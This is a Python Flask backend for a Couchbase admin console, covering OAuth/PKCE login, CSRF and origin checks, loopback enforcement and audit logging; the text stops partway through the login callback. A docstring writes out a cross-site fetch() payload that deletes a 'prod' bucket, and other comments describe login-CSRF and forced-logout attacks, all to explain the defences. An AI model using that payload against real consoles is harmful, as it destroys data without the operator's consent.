"""
gui_server.py - Flask backend for the Couchbase MCP GUI.

Authentication modes (controlled by OAUTH_ENABLED env var):
  - OAUTH_ENABLED=false (default): no auth — original behaviour, localhost only.
  - OAUTH_ENABLED=true:            Generic OIDC / OAuth 2.0.

      Authorization Code + PKCE  (browser GUI login)
        Users are redirected to the IdP login page. On return the server
        exchanges the code for tokens, validates the JWT, and stores the
        session server-side. A signed HttpOnly cookie tracks the session.

      Client Credentials  (M2M / API access)
        Clients hold their own client credentials and obtain tokens DIRECTLY
        from the IdP's token endpoint, then supply them as
        Authorization: Bearer <token> on /api/* requests. This server validates
        tokens; it never issues them.

Required env vars when OAUTH_ENABLED=true
  OAUTH_ISSUER              https://your-idp.example.com/realms/mcp
  OAUTH_CLIENT_ID           <app client ID registered with the IdP>
  OAUTH_CLIENT_SECRET       <app client secret>
  OAUTH_REDIRECT_URI        http://localhost:5173/auth/callback
  OAUTH_SESSION_SECRET      <random hex string — python -c "import secrets;print(secrets.token_hex(32))">

Optional
  OAUTH_SCOPES              openid profile email  (defaults shown)
  OAUTH_AUDIENCE            <API audience / resource indicator>
  OAUTH_ALGORITHMS          RS256  (space-separated; used for token validation)
  OAUTH_SKIP_VERIFY         false  (DEVELOPMENT ONLY — disables JWT sig check)
  OAUTH_SESSION_TTL_SECONDS 28800  (8 hours)
  OAUTH_CC_CLIENT_ID        (separate M2M client — defaults to OAUTH_CLIENT_ID)
  OAUTH_CC_CLIENT_SECRET    (separate M2M secret  — defaults to OAUTH_CLIENT_SECRET)
  OAUTH_CC_SCOPES           (M2M scopes — auto-derived from OAUTH_SCOPES if unset)

All other security primitives from the original gui_server remain:
  * CORS restricted to localhost origins
  * Config allow-list, password redaction
  * Read-only mode, disabled-tools enforcement
  * Confirmation gate for destructive operations
  * Refuses to bind 0.0.0.0 without CB_GUI_ALLOW_REMOTE=1

Run:
    cd /path/to/MCP-Couchbase
    python gui/gui_server.py
"""

from __future__ import annotations

import json
import os
import re
import secrets
import sys
import time
from typing import Any

# ---------------------------------------------------------------------------
# Path setup — must happen before handler imports
# ---------------------------------------------------------------------------
SERVER_ROOT = os.path.join(os.path.dirname(__file__), "..")
sys.path.insert(0, os.path.abspath(SERVER_ROOT))

from flask import (  # noqa: E402
    Flask,
    jsonify,
    make_response,
    redirect,
    request,
    send_from_directory,
)
from flask_cors import CORS  # noqa: E402

# The profile must be applied HERE too, not only in server.py. This module reads
# OAUTH_ENABLED / CB_GUI_INSECURE_NO_AUTH and imports handlers.shared (which
# snapshots CB_ADMIN_READ_ONLY_MODE), and it previously never imported
# profile_config at all — so the enterprise defaults never reached the GUI, the
# console was broken in both profiles, and critically `profile_config.validate()`
# never ran for the one process it is meant to protect: `server.py` would exit 2 on
# an incoherent posture while this process started and served the full destructive
# tool surface.
import deployment  # noqa: E402
import mcp_compat  # noqa: E402
import profile_config  # noqa: E402


def _enforce_gui_posture() -> None:
    """Refuse to serve an incoherent or exposed posture. Module scope, not __main__.

    Two defects this replaces:

      * The old guard compared `host == "0.0.0.0"` literally, so `::`, an empty
        value, or any specific LAN address bound a network interface unchallenged —
        while the workstation profile sets CB_GUI_INSECURE_NO_AUTH=1, which waves
        every /api/* request through.
      * It lived under `if __name__ == "__main__"`, so `gunicorn gui.gui_server:app`
        or any container entrypoint skipped it completely.
    """
    import ipaddress

    problems = list(profile_config.PROFILE_ERRORS)

    # Same rule as the MCP server: a requested-but-unusable audit sink is fatal.
    import audit as _audit_mod

    _sink_problem = _audit_mod.audit_sink_error()
    if _sink_problem:
        problems.append(_sink_problem)

    # Session configuration, but only when OAuth is on — with auth disabled no session
    # cookie is ever issued, so demanding a signing secret would be noise.
    if os.environ.get("OAUTH_ENABLED", "false").strip().lower() in (
        "1",
        "true",
        "yes",
        "on",
    ):
        from auth import session as _session_mod

        problems.extend(_session_mod.validate_startup())

    host = (os.environ.get("GUI_HOST") or "127.0.0.1").strip()
    allow_remote = (os.environ.get("CB_GUI_ALLOW_REMOTE") or "").strip().lower() in (
        "1",
        "true",
        "yes",
        "on",
    )

    def _is_loopback(candidate: str) -> bool:
        if candidate in ("localhost", "localhost.localdomain"):
            return True
        try:
            return ipaddress.ip_address(candidate).is_loopback
        except ValueError:
            return False

    exposed = bool(host) and not _is_loopback(host)
    if not host:
        # An empty GUI_HOST makes Werkzeug bind every interface.
        exposed = True

    if exposed and _INSECURE_NO_AUTH_ACKNOWLEDGED:
        problems.append(
            f"GUI_HOST={host or '(empty = all interfaces)'} exposes a network "
            "interface while CB_GUI_INSECURE_NO_AUTH is set, which serves the full "
            "admin tool surface — including destructive tools — to any client that "
            "can reach the port. Set OAUTH_ENABLED=true, or bind loopback."
        )
    if exposed and not allow_remote:
        problems.append(
            f"GUI_HOST={host or '(empty = all interfaces)'} is not a loopback "
            "address and CB_GUI_ALLOW_REMOTE is not set."
        )

    # TLS posture, on the console's OWN bind. server._enforce_profile calls
    # tls_config.validate for the MCP transport; this process never did, so the
    # console would start on a network interface in cleartext with no
    # external-termination acknowledgement -- and auth.session.cookie_is_secure()
    # then returns False, so the session cookie fronting the whole destructive tool
    # surface was issued without Secure over plain HTTP. The MCP transport refuses
    # the identical posture with a fatal error.
    if exposed:
        import tls_config as _tls

        problems.extend(_tls.validate(host, "http"))

    if problems:
        for problem in problems:
            print(
                f"[couchbase-admin-gui] REFUSING TO START: {problem}", file=sys.stderr
            )
        raise SystemExit(2)


import audit  # noqa: E402
import authz  # noqa: E402
import dryrun  # noqa: E402
from auth.scope_gate import (  # noqa: E402
    check_scope,
    clear_token_claims,
    is_read_side,
    principal_of,
    session_has_automation_scope,
    set_token_claims,
)
from handlers import (  # noqa: E402
    backup,
    buckets,
    capella,
    cluster,
    collections,
    diagnostics,
    eight_x,
    encryption,
    eventing,
    indexes,
    mcp_status,
    search_admin,
    security,
    shared,
    stats,
    xdcr,
)
from handlers.shared import (  # noqa: E402
    _CUSTOM_CONFIRMATION_TOOLS,
    DISABLED_TOOLS,
    READ_ONLY_MODE,
    require_confirmation,
)
from handlers.shared import (  # noqa: E402
    redact_uri_credentials as _shared_redact_uri_credentials,
)
from logging_config import configure_from_env  # noqa: E402

# ---------------------------------------------------------------------------
# OAuth feature flag
# ---------------------------------------------------------------------------
#: Explicit, deliberately awkward acknowledgement that the GUI is running with no
#: authentication. Required because "unauthenticated by default" is not a posture
#: an administration console can ship with.
_INSECURE_NO_AUTH_ACKNOWLEDGED = os.environ.get(
    "CB_GUI_INSECURE_NO_AUTH", ""
).strip().lower() in ("1", "true", "yes")

_OAUTH_ENABLED = os.environ.get("OAUTH_ENABLED", "false").lower() in (
    "1",
    "true",
    "yes",
    "on",
)

if _OAUTH_ENABLED:
    from auth import oidc as _oidc
    from auth import session as _session

# ---------------------------------------------------------------------------
# Flask app
# ---------------------------------------------------------------------------
# Enforced at import so a WSGI launch (gunicorn/uwsgi) cannot skip it.
_enforce_gui_posture()

# Configure logging in THIS process.
#
# configure_from_env() had exactly one caller — server.py — so the GUI process never
# configured the `couchbase-admin` logger tree. Records propagated to a root logger
# with no handlers, and logging.lastResort only emits at WARNING, so every INFO-level
# AUDIT record from the console was DISCARDED. The round-3 fix that added
# `_audit_gui` on every path was therefore inert in the workstation profile, and the
# console remained the one way to perform a privileged operation without leaving a
# trace — the exact property it was added to remove.
#
# The GUI tests did not catch it because caplog attaches to the root logger and
# observes the logger CALL, which happens either way.
configure_from_env()

app = Flask(__name__, static_folder="static")

# CB_GUI_ALLOWED_ORIGINS is honoured HERE as well as in _reject_cross_site_request.
# Without it the refusal message told operators to set the variable, the request-side
# check honoured it, and then no Access-Control-Allow-Origin header was emitted — so the
# browser blocked the read anyway and the documented escape hatch did not work.
CORS(
    app,
    origins=[
        re.compile(r"^https?://localhost(:[0-9]+)?$"),
        re.compile(r"^https?://127\.0\.0\.1(:[0-9]+)?$"),
        re.compile(r"^https?://\[::1\](:[0-9]+)?$"),
        *[
            o.strip()
            for o in (os.environ.get("CB_GUI_ALLOWED_ORIGINS") or "").split(",")
            if o.strip()
        ],
    ],
    supports_credentials=True,  # Required for cookie-based sessions
)

# ---------------------------------------------------------------------------
# Tool registry
# ---------------------------------------------------------------------------
ALL_TOOLS = (
    buckets.TOOLS
    + collections.TOOLS
    + security.TOOLS
    + cluster.TOOLS
    + xdcr.TOOLS
    + indexes.TOOLS
    + search_admin.TOOLS
    + stats.TOOLS
    + diagnostics.TOOLS
    + eight_x.TOOLS
    + backup.TOOLS
    + eventing.TOOLS
    + encryption.TOOLS
    + capella.TOOLS
    + mcp_status.TOOLS
)

HANDLERS = {
    **{t.name: buckets for t in buckets.TOOLS},
    **{t.name: collections for t in collections.TOOLS},
    **{t.name: security for t in security.TOOLS},
    **{t.name: cluster for t in cluster.TOOLS},
    **{t.name: xdcr for t in xdcr.TOOLS},
    **{t.name: indexes for t in indexes.TOOLS},
    **{t.name: search_admin for t in search_admin.TOOLS},
    **{t.name: stats for t in stats.TOOLS},
    **{t.name: diagnostics for t in diagnostics.TOOLS},
    **{t.name: eight_x for t in eight_x.TOOLS},
    **{t.name: backup for t in backup.TOOLS},
    **{t.name: capella for t in capella.TOOLS},
    **{t.name: eventing for t in eventing.TOOLS},
    **{t.name: encryption for t in encryption.TOOLS},
    **{t.name: mcp_status for t in mcp_status.TOOLS},
}

TOOL_INDEX = {t.name: t for t in ALL_TOOLS}

#: The same confirmation set server.py computes, so `confirm` is advertised on the
#: same tools through both paths. require_confirmation() below is the authority; this
#: only decides what the schema SAYS.
_CONSOLE_CONFIRMATION_REQUIRED: set[str] = {
    t.name for t in ALL_TOOLS if not is_read_side(t)
} | _CUSTOM_CONFIRMATION_TOOLS

# Register the handler-owned dry_run set in THIS process too.
#
# Only server.py called this, so _HANDLER_OWNED was empty here: handler_owns() was
# False for capella_env_reap, the console intercepted its dry_run and stripped the
# flag, and the handler fell back to its own default of True. A reap through the
# console was therefore ALWAYS a preview and expired Capella environments billed
# forever -- BUG-2 reintroduced through the second dispatch path, which is the exact
# defect class this codebase keeps producing.
dryrun.register_handler_owned(ALL_TOOLS)


# ---------------------------------------------------------------------------
# Safety helpers (unchanged from original)
# ---------------------------------------------------------------------------
def _is_destructive(tool) -> bool:
    return bool(tool) and mcp_compat.is_destructive(tool)


def _is_read_only(tool) -> bool:
    return bool(tool) and mcp_compat.is_read_only(tool)


#: Deployment gating, exactly as server.py applies it. The console ignored it
#: entirely, so against Capella it advertised and would execute ~120 ns_server tools
#: that cannot work there — the "tools that each fail with an opaque 401" problem the
#: gating layer was written to remove, reintroduced through the other door.
_DEPLOYMENT_MODE = deployment.detect_mode()
_GATING = deployment.gating_enabled()


def _tool_is_deployable(name: str) -> bool:
    return not _GATING or deployment.tool_is_available(name, _DEPLOYMENT_MODE)


def _visible_tools():
    # Admin server has no internally-DML-gated tools, so nothing is force-loaded
    # in read-only mode beyond the annotated read-only tools.
    always_loaded_in_ro: set[str] = set()
    out = []
    for t in ALL_TOOLS:
        if t.name in DISABLED_TOOLS:
            continue
        if not _tool_is_deployable(t.name):
            continue
        if (
            READ_ONLY_MODE
            and not _is_read_only(t)
            and t.name not in always_loaded_in_ro
        ):
            continue
        out.append(t)
    return out


# ---------------------------------------------------------------------------
# Config allow-list and redaction (unchanged from original)
# ---------------------------------------------------------------------------
_CONFIG_ALLOWLIST = {
    "CB_CONNECTION_STRING",
    "CB_USERNAME",
    "CB_PASSWORD",
    "CB_BUCKET",
    "CB_SCOPE",
    "CB_COLLECTION",
    "CB_MGMT_PORT",
    "CB_CA_CERT_PATH",
    "CB_CLIENT_CERT_PATH",
    "CB_CLIENT_KEY_PATH",
    "CB_ADMIN_TLS_INSECURE",
    "CB_ADMIN_READ_ONLY_MODE",
    "CB_ADMIN_DISABLED_TOOLS",
    "CB_ADMIN_CONFIRMATION_REQUIRED_TOOLS",
    "CB_ADMIN_HTTP_RETRIES",
    "CB_ADMIN_HTTP_TIMEOUT",
    "CAPELLA_API_KEY_SECRET",
}
_REDACTED_FIELDS = {"CB_PASSWORD", "CAPELLA_API_KEY_SECRET", "CB_CLIENT_KEY_PATH"}


def _redact(key: str, value: str) -> str:
    """Mask a configuration value before it is shown in the console.

    Masking by KEY NAME alone is not enough, and this leaked because of it:
    `CB_PASSWORD` was masked while `CB_CONNECTION_STRING` was returned verbatim — and a
    Couchbase connection string can carry the password in its URI userinfo
    (`couchbases://admin:secret@host`). So /api/config handed the cluster password to the
    browser while displaying `********` beside it, which is worse than not masking at all
    because it looks handled.

    Exactly the same shape as the `cb_mcp_status` disclosure: `redact()` masks on key names,
    and "connection_string" resembles nothing sensitive.
    """
    if not value:
        return ""
    if key in _REDACTED_FIELDS:
        return "********"
    return _shared_redact_uri_credentials(value)


# ---------------------------------------------------------------------------
# Authentication middleware
# ---------------------------------------------------------------------------


def _get_bearer_token() -> str | None:
    """Extract a Bearer token from the Authorization header."""
    auth = request.headers.get("Authorization", "")
    if auth.lower().startswith("bearer "):
        return auth[7:].strip()
    return None


def _get_session_claims() -> dict[str, Any] | None:
    """Return validated claims from the session cookie, or None."""
    cookie = request.cookies.get(_session.SESSION_COOKIE)
    if not cookie:
        return None
    sess = _session.get_session(cookie)
    if not sess:
        return None

    # Check whether the access token has expired; try silent refresh
    expires_at = sess.get("expires_at", 0)
    if time.time() >= expires_at - 60:  # 60 s buffer
        refresh_token = sess.get("refresh_token")
        if not refresh_token:
            # No way to refresh an expired session — treat as logged out
            _session.delete_session(cookie)
            return None
        try:
            tokens = _oidc.refresh_access_token(refresh_token)
            new_expires = time.time() + tokens.get("expires_in", 3600)
            # Re-validate the freshly issued token so stored claims stay
            # in sync with the new token (expiry, roles, etc.).
            new_token = tokens.get("access_token") or tokens.get("id_token", "")
            new_claims = _oidc.validate_token(new_token)
            _session.update_session(
                cookie,
                {
                    "access_token": tokens.get("access_token", ""),
                    "id_token": tokens.get("id_token", sess.get("id_token", "")),
                    "expires_at": new_expires,
                    "refresh_token": tokens.get("refresh_token", refresh_token),
                    "claims": new_claims,
                },
            )
            return new_claims
        except Exception:
            # Refresh or re-validation failed — session is dead
            _session.delete_session(cookie)
            return None

    return sess.get("claims")


def _resolve_claims() -> dict[str, Any] | None:
    """
    Resolve authenticated identity from either:
      1. Authorization: Bearer <token>  (Client Credentials / API callers)
      2. Session cookie                 (Authorization Code / browser users)
    Returns decoded JWT claims on success, None if unauthenticated.
    """
    # Bearer token takes precedence
    token = _get_bearer_token()
    if token:
        try:
            return _oidc.validate_token(token)
        except Exception:
            return None

    return _get_session_claims()


# Public paths — never require auth
_PUBLIC_PATHS = {
    "/auth/login",
    "/auth/callback",
    "/auth/logout",
    "/auth/status",
}


def _is_public(path: str) -> bool:
    return path in _PUBLIC_PATHS or path.startswith("/static/")


# NOTE: there is deliberately no `require_auth` decorator here any more.
#
# One was defined, complete with a 403 branch for the unauthenticated case, and was
# NEVER APPLIED to a single route — the actual enforcement is the `global_auth_check`
# before_request hook below. Dead security code is worse than none: it reads as a
# control when someone greps for it, and its unreachable branches invite the
# assumption that routes are individually protected.


#: Origins permitted to drive the console from a browser. The same shapes flask_cors
#: is configured with — but enforced on the REQUEST, which is the part that matters.
_ORIGIN_RE = re.compile(
    r"^https?://(localhost|127\.0\.0\.1|\[::1\])(:[0-9]+)?$", re.IGNORECASE
)


def _extra_allowed_origins() -> list[str]:
    return [
        o.strip()
        for o in (os.environ.get("CB_GUI_ALLOWED_ORIGINS") or "").split(",")
        if o.strip()
    ]


def _origin_is_allowed(origin: str) -> bool:
    return bool(_ORIGIN_RE.match(origin)) or origin in _extra_allowed_origins()


def _reject_cross_site_request():
    """Refuse browser-driven cross-site calls to the admin API.

    flask_cors DOES NOT DO THIS. CORS governs whether the browser lets the calling
    page READ the response; the request is dispatched and its side effects happen
    regardless. Combined with ``get_json(force=True)`` — which parsed a JSON body
    whatever the Content-Type — any page the developer visited could issue:

        fetch("http://127.0.0.1:5173/api/call", {
          method: "POST", mode: "no-cors",
          headers: {"Content-Type": "text/plain"},
          body: JSON.stringify({tool: "admin_bucket_delete",
                                arguments: {bucket_name: "prod", confirm: true}})})

    A "simple" request by CORS rules, so no preflight is sent and nothing is asked.
    On a workstation the profile ships CB_GUI_INSECURE_NO_AUTH=1 (no cookie, no
    token, so SameSite protects nothing), and the attacker's own ``confirm: true``
    satisfied even the hard ceiling. The peer-address check passes trivially: the
    browser IS on the developer's machine.

    Two independent defences, because either alone has an edge case:

      1. Require Content-Type: application/json on state-changing requests. That
         makes a cross-origin fetch a NON-simple request, so the browser must
         preflight it, and the preflight fails against the origin allowlist. This is
         what actually stops the attack above.
      2. Validate Origin (falling back to Referer) when present. Defence in depth,
         and it matches what the MCP HTTP transport already does — the console, which
         is the more browser-exposed of the two, had nothing.
    """
    # /auth/logout is a GET route with a side effect (it clears the session), so a
    # cross-site GET could force a logout. Cheap to cover, so it is covered.
    if request.method in ("GET", "HEAD", "OPTIONS") and request.path != "/auth/logout":
        return None
    if not request.path.startswith("/api/") and not request.path.startswith("/auth/"):
        return None

    origin = (request.headers.get("Origin") or "").strip()
    if not origin:
        referer = (request.headers.get("Referer") or "").strip()
        if referer:
            from urllib.parse import urlsplit

            parts = urlsplit(referer)
            if parts.scheme and parts.netloc:
                origin = f"{parts.scheme}://{parts.netloc}"

    # Sec-Fetch-Site closes the gap the Origin/Referer pair leaves open.
    #
    # The check below only fires `if origin`, so an attacker page with
    # `Referrer-Policy: no-referrer` embedding <img src=".../auth/logout"> sent NEITHER
    # header, passed, and cleared the operator's session -- the one route the comment
    # above claims is covered.
    #
    # Requiring Origin/Referer instead would break ordinary direct navigation to
    # /auth/logout, which legitimately sends neither. Sec-Fetch-Site is the right
    # instrument: it is a FORBIDDEN header, so page script cannot set or strip it, every
    # current browser sends it, and it distinguishes the two cases the other headers
    # cannot -- `cross-site` for the img-tag attack versus `none` for someone typing the
    # URL. Absent (an old client) falls through rather than breaking them.
    fetch_site = (request.headers.get("Sec-Fetch-Site") or "").strip().lower()
    if fetch_site in ("cross-site", "same-site") and not _origin_is_allowed(origin):
        return (
            jsonify(
                {
                    "ok": False,
                    "error": (
                        f"Cross-site request refused: this request was initiated from "
                        f"another site (Sec-Fetch-Site: {fetch_site}). If a different "
                        "origin legitimately serves this console, set "
                        "CB_GUI_ALLOWED_ORIGINS."
                    ),
                }
            ),
            403,
        )

    if origin and not _origin_is_allowed(origin):
        return (
            jsonify(
                {
                    "ok": False,
                    "error": (
                        f"Cross-site request refused: Origin {origin!r} is not "
                        "permitted to drive this console. Set CB_GUI_ALLOWED_ORIGINS "
                        "if a different origin is legitimately serving the UI."
                    ),
                }
            ),
            403,
        )

    if request.path.startswith("/api/"):
        content_type = (request.content_type or "").split(";")[0].strip().lower()
        if content_type != "application/json":
            return (
                jsonify(
                    {
                        "ok": False,
                        "error": (
                            "Content-Type: application/json is required on this "
                            f"endpoint (got {content_type or 'none'}). This is a CSRF "
                            "defence: requiring it forces a browser to preflight any "
                            "cross-origin call, which the origin allowlist then "
                            "refuses."
                        ),
                    }
                ),
                415,
            )
    return None


def _client_is_local() -> bool:
    """Whether this request came from THIS machine.

    The startup posture check reads GUI_HOST, which only the __main__ launcher sets:
    `gunicorn -b 0.0.0.0:5173 gui.gui_server:app` leaves it unset, the check reads
    the 127.0.0.1 default, and the process happily serves an unauthenticated admin
    console on every interface — bypassing the guard specifically written to stop
    that, via the launcher the container entrypoint actually uses.

    Guessing the bind from argv or gunicorn internals would be more of the same kind
    of inference. The peer address is the ground truth: a completed TCP handshake
    from off-box cannot carry a loopback source address. X-Forwarded-For is
    deliberately NOT consulted — trusting a header here would let any client claim
    to be local.
    """
    import ipaddress

    remote = (request.remote_addr or "").strip()
    if not remote:
        return False

    # A forwarding header means an intermediary is present, and REMOTE_ADDR is then
    # the PROXY's address rather than the client's. nginx or Traefik on the same host
    # in front of 127.0.0.1:5173 makes every remote client look loopback, which turns
    # this check into a rubber stamp — and _enforce_gui_posture sees GUI_HOST=127.0.0.1
    # and raises nothing. Refusing rather than guessing: the header is not trusted to
    # identify the client (that would be worse), it is only taken as evidence that
    # REMOTE_ADDR cannot be believed.
    for header in (
        "X-Forwarded-For",
        "X-Real-IP",
        "Forwarded",
        "X-Client-IP",
        # A proxy that rewrites only these and no X-Forwarded-For is unusual but
        # possible, and each one is equally good evidence that REMOTE_ADDR is the
        # proxy's address rather than the client's.
        "X-Forwarded-Host",
        "X-Forwarded-Proto",
        "X-Original-Forwarded-For",
        "CF-Connecting-IP",
        "True-Client-IP",
    ):
        if request.headers.get(header):
            return False

    try:
        address = ipaddress.ip_address(remote.split("%")[0])
    except ValueError:
        return False

    # A dual-stack socket reports a v4 client as ::ffff:127.0.0.1, and is_loopback is
    # False for that — so genuine local clients were being refused. handlers/egress.py
    # already normalises this; the check here did not.
    mapped = getattr(address, "ipv4_mapped", None)
    if mapped is not None:
        address = mapped
    return address.is_loopback


# Apply auth check to all routes via before_request
@app.before_request
def global_auth_check():
    # Claims must not leak between requests. Flask serves requests on pooled
    # threads, and a contextvar set in a thread persists for that thread's life —
    # so without this, request N+1 on the same worker thread could inherit request
    # N's identity and scopes.
    clear_token_claims()

    cross_site = _reject_cross_site_request()
    if cross_site is not None:
        return cross_site

    if _INSECURE_NO_AUTH_ACKNOWLEDGED and not _client_is_local():
        audit.emit_auth_failure(
            reason="non-loopback request while CB_GUI_INSECURE_NO_AUTH is set",
            source=request.remote_addr or "",
        )
        return (
            jsonify(
                {
                    "ok": False,
                    "error": (
                        "This console is running with CB_GUI_INSECURE_NO_AUTH set, "
                        "which is only defensible for a local operator, and this "
                        "request arrived from a non-loopback address "
                        f"({request.remote_addr}). Refusing. Set OAUTH_ENABLED=true "
                        "to serve remote clients."
                    ),
                }
            ),
            403,
        )

    if not _OAUTH_ENABLED:
        # Fail closed. With OAUTH_ENABLED unset — the default, and a variable that
        # appears in neither .env.example nor the README — this returned None and
        # every route, including /api/call, was open to any client that could reach
        # the port: full tool enumeration and execution of every loaded tool,
        # destructive ones included.
        if not _INSECURE_NO_AUTH_ACKNOWLEDGED and request.path.startswith("/api/"):
            audit.emit_auth_failure(
                reason="admin API requested with OAuth disabled and no acknowledgement",
                source=request.remote_addr or "",
            )
            return (
                jsonify(
                    {
                        "ok": False,
                        "error": (
                            "Refusing to serve the admin API without "
                            "authentication. Set OAUTH_ENABLED=true, or set "
                            "CB_GUI_INSECURE_NO_AUTH=1 to acknowledge running "
                            "unauthenticated on a trusted loopback interface."
                        ),
                    }
                ),
                403,
            )
        return None
    if _is_public(request.path):
        return None
    # Static files pass through
    if request.path.startswith("/static/"):
        return None
    claims = _resolve_claims()
    if claims is None:
        # For API routes return JSON; for all others (SPA) let the frontend handle it
        if request.path.startswith("/api/"):
            # AUDIT it. The MCP transport emits emit_auth_failure at its edge, so an
            # attacker spraying tokens there leaves a trail; on the console the same
            # traffic produced 401s and no audit events at all, which meant "an audit
            # trail that only contains successful calls cannot show an attempted
            # intrusion" held for one dispatch path and not the other.
            audit.emit_auth_failure(
                reason="no valid session or bearer token",
                source=request.remote_addr or "",
            )
            return jsonify({"error": "Unauthorized", "auth_required": True}), 401
        # Non-API routes serve the SPA which handles the redirect
        return None
    request.oauth_claims = claims  # type: ignore[attr-defined]
    # Publish to the scope gate. Without this, check_scope() and
    # session_has_automation_scope() saw no claims at all in this process, so the
    # console ignored the token's scopes entirely: ANY authenticated user in the
    # tenant — read-only scope or none — had the full destructive tool surface.
    set_token_claims(claims)
    return None


@app.teardown_request
def _clear_claims(_exc=None):
    clear_token_claims()


# ---------------------------------------------------------------------------
# OAuth endpoints  (/auth/*)
# ---------------------------------------------------------------------------

# Temporary PKCE state store: { state: { verifier, next, created_at } }
# Entries are cleaned up on each new login attempt (max 10-minute lifetime).
_pkce_store: dict[str, dict[str, str]] = {}
_PKCE_TTL = 600  # 10 minutes — enough to complete a browser login

#: Upper bound on outstanding logins, so an unauthenticated flood cannot grow the
#: store for a whole TTL window.
_MAX_PKCE_ENTRIES = 256

#: Cookie carrying the state of the login this browser started. Path-scoped to
#: /auth/ so it is not sent with ordinary console traffic.
_LOGIN_STATE_COOKIE = "cb_admin_login_state"

#: The shape secrets.token_urlsafe(32) produces. Checked before any comparison so a
#: malformed `state` is a 400 rather than a TypeError from compare_digest.
_STATE_RE = re.compile(r"^[A-Za-z0-9_-]{16,128}$")


def _pkce_purge() -> None:
    """Remove PKCE entries older than _PKCE_TTL seconds."""
    cutoff = time.time() - _PKCE_TTL
    stale = [
        s for s, v in _pkce_store.items() if float(v.get("created_at", 0)) < cutoff
    ]
    for s in stale:
        _pkce_store.pop(s, None)


@app.route("/auth/status")
def auth_status():
    """
    Returns whether OAuth is enabled and, if so, whether the current
    request is authenticated.  Always public (no auth check).
    """
    if not _OAUTH_ENABLED:
        return jsonify({"oauth_enabled": False, "authenticated": True})

    claims = _resolve_claims()
    if claims is None:
        return jsonify({"oauth_enabled": True, "authenticated": False})

    return jsonify(
        {
            "oauth_enabled": True,
            "authenticated": True,
            "user": _oidc.userinfo_from_claims(claims),
        }
    )


@app.route("/auth/login")
def auth_login():
    """
    Initiate the Authorization Code + PKCE flow.
    Redirects the browser to the IdP login page.
    Query param:  ?next=<path>  to redirect after login (must be a relative path).
    """
    if not _OAUTH_ENABLED:
        return jsonify({"error": "OAuth not enabled"}), 400

    raw_next = request.args.get("next", "/")
    # Validate next_url is a relative path — reject anything with a scheme
    # or host to prevent open redirect attacks.
    from urllib.parse import urlparse as _urlparse

    parsed = _urlparse(raw_next)
    next_url = raw_next if (not parsed.scheme and not parsed.netloc) else "/"

    from auth import session as _session

    _pkce_purge()
    state = secrets.token_urlsafe(32)
    verifier, challenge = _oidc.generate_pkce_pair()
    _pkce_store[state] = {
        "verifier": verifier,
        "next": next_url,
        "created_at": str(time.time()),
    }
    # Hard cap in addition to the TTL purge. _pkce_purge only evicts entries older
    # than _PKCE_TTL and only runs on this route, so unauthenticated login floods
    # grew the store unboundedly for a full 10-minute window while making the purge's
    # scan quadratic.
    if len(_pkce_store) > _MAX_PKCE_ENTRIES:
        for stale_state in sorted(
            _pkce_store, key=lambda k: float(_pkce_store[k].get("created_at", 0))
        )[: len(_pkce_store) - _MAX_PKCE_ENTRIES]:
            _pkce_store.pop(stale_state, None)

    try:
        url = _oidc.build_authorization_url(state=state, code_challenge=challenge)
    except RuntimeError as exc:
        return jsonify({"error": str(exc)}), 500

    # BIND the state to the browser that started this login.
    #
    # The store was keyed only by `state`, so any browser could redeem any outstanding
    # state: an attacker starts a login, authenticates at the IdP, then links the
    # victim to /auth/callback?code=<attacker code>&state=<attacker state> and the
    # victim's browser is issued a session for the ATTACKER's identity. Verified with
    # two independent clients. The state now has to arrive in BOTH the query string
    # and a cookie only the initiating browser holds.
    response = redirect(url)
    response.set_cookie(
        _LOGIN_STATE_COOKIE,
        state,
        max_age=_PKCE_TTL,
        httponly=True,
        samesite="Lax",
        secure=_session.cookie_is_secure(),
        path="/auth/",
    )
    return response


@app.route("/auth/callback")
def auth_callback():
    """
    IdP redirects here after user authentication.
    Validates state, exchanges code for tokens, validates the JWT,
    creates a session, and redirects to the original destination.
    """
    if not _OAUTH_ENABLED:
        return jsonify({"error": "OAuth not enabled"}), 400

    error = request.args.get("error")
    if error:
        desc = request.args.get("error_description", error)
        return jsonify({"error": f"IdP error: {desc}"}), 400

    state = request.args.get("state", "")
    code = request.args.get("code", "")

    if not code:
        return jsonify({"error": "Missing authorization code in callback."}), 400

    # The state must match the cookie set when THIS browser began the login.
    #
    # Compared as BYTES: secrets.compare_digest raises TypeError on a non-ASCII str, and
    # `state` is unvalidated query input -- so /auth/callback?state=%C3%A9 was an
    # unauthenticated HTTP 500 with a traceback. The shape is checked first, so a value
    # that cannot be one of our states is refused before any comparison.
    cookie_state = request.cookies.get(_LOGIN_STATE_COOKIE, "")
    if not _STATE_RE.fullmatch(state or "") or not cookie_state:
        return jsonify(
            {
                "error": (
                    "This login was not started in this browser. Begin again from "
                    "/auth/login."
                )
            }
        ), 400
    if not secrets.compare_digest(cookie_state.encode(), state.encode()):
        # The entry is NOT popped on a cookie mismatch, so a mismatched callback cannot
        # be used to delete an outstanding login someone else is mid-way through. It is
        # collected by the TTL purge and bounded by _MAX_PKCE_ENTRIES.
        #
        # To be accurate about what this does NOT fix: two concurrent logins in one
        # browser still leave the FIRST tab unusable, because there is a single
        # state cookie and the second login overwrites it. The first tab gets a 400 and
        # must start again. That is a usability wart, not a security one -- the state is
        # a 43-character secret, an attacker without the cookie gets 400, and the owner
        # of the newest login still completes normally. Fixing it properly means a
        # per-login cookie, which is not worth the surface today.
        return jsonify(
            {
                "error": (
                    "This login was not started in this browser, or a newer login "
                    "replaced it. Begin again from /auth/login."
                )
            }
        ), 400

    pkce = _pkce_store.pop(state, None)
    if pkce is None:
        return jsonify(
            {
                "error": "Invalid or expired state parameter. Please try logging in again."
            }
        ), 400

    # Enforce the TTL HERE too. _pkce_purge runs only on /auth/login, so with no
    # further logins a state stayed redeemable indefinitely -- a day-old state was
    # accepted.
    try:
        age = time.time() - float(pkce.get("created_at", 0))
    except (TypeError, ValueError):
        age = _PKCE_TTL + 1
    if age > _PKCE_TTL:
        return jsonify(
            {"error": "This login attempt has expired. Please start again."}
        ), 400

    try:
        tokens = _oidc.exchange_code(code=code, code_verifier=pkce["verifier"])
    except Exception as exc:
        return jsonify({"error": f"Token exchange failed: {exc}"}), 400

    # Validate the access token (or id_token if no access token)
    token_to_validate = tokens.get("access_token") or tokens.get("id_token", "")
    if not token_to_validate:
        return jsonify({"error": "IdP returned no access or ID token."}), 502
    try:
        claims = _oidc.validate_token(token_to_validate)
    except Exception as exc:
        return jsonify({"error": f"Token validation failed: {exc}"}), 401

    expires_at = time.time() + tokens.get("expires_in", 3600)

